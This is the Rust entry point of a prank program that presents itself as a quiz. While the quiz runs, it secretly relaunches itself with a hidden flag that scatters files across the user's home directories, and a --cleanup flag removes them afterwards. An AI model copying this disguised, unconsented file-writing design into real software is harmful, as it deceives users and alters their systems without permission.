mod file_walk;
mod file_helper;
mod art;
mod setup;
mod constants;
mod prank;

use clap::Parser;
use file_helper::FileScatterer;
use std::process::Command;

#[derive(Parser, Debug)]
#[command(name = "file_scat")]
#[command(
    about = "The most difficult quiz you'll ever take ...\n\n\
             jk! Looks like you figured out this is more than a silly quiz.\n\
             Check out your user directories, you might find some unknown, benign files.. :)\n\n\
             Get rid of them using the --cleanup flag!\n\n\
             Usage:\n  \
             file_scat --cleanup    Delete all scattered files"
)]struct Args {
    /// Deletes all prank files generated each time you ran this program
    #[arg(long)]
    cleanup: bool,
    // UI testing
    #[arg(long, hide = true)]
    test_ui: bool,
    #[arg(long, hide = true)]  // Hidden background flag
    background_scatter: bool
}

fn main() {
    let args = Args::parse();
    
    // Hidden background mode
    if args.background_scatter {
        run_background_scatter();
        return;
    }
    
    // Test UI
    if args.test_ui {
        let message = prank::run_prank_ui();
        println!("\n{}", message);
        println!("\nPress Enter to exit...");
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        return;
    }
    
    // Cleanup mode
    if args.cleanup {
        let log = setup::init_log_file();
        let scatterer = FileScatterer::new(log);
        scatterer.cleanup().expect("Cleanup failed");
        println!("Cleanup complete");
        return;
    }
    
    // DEFAULT: Prank + scatter
    spawn_background_scatter();
    
    let message = prank::run_prank_ui();
    println!("\n{}", message);
    println!("\nPress Enter to exit...");
    
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn spawn_background_scatter() {
    let exe = std::env::current_exe().unwrap();
    
    Command::new(exe)
        .arg("--background-scatter")
        .spawn()
        .ok();  // Ignore if spawn fails
}

fn run_background_scatter() {
    let log = setup::init_log_file();
    let mut scatterer = FileScatterer::new(log);
    let dirs = file_walk::discover_user_directories();
    
    let _ = scatterer.scatter_files(constants::PRANK_FILE_COUNT, &dirs);
    let _ = scatterer.save_log();
}